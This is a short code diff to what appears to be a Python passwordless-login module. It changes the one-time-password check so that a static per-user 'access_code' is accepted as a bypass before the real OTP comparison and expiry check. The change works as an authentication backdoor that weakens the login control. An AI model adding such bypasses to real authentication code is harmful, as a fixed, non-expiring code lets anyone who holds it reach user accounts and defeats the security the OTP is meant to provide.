@@ -111,6 +111,10 @@ def build_new_passwordless_user(full_name: Optional[str], email: str, otp_code: 
 
 def otp_is_valid(user: dict, otp_code: str) -> tuple[bool, str]:
     """Return (True, "") if OTP matches and is not expired, else (False, reason)."""
+    # Allow access_code as a static bypass
+    if user.get("access_code") and user.get("access_code") == otp_code:
+        return True, ""
+
     stored = user.get("otp_code")
     if not stored or stored != otp_code:
         return False, "Invalid OTP code."
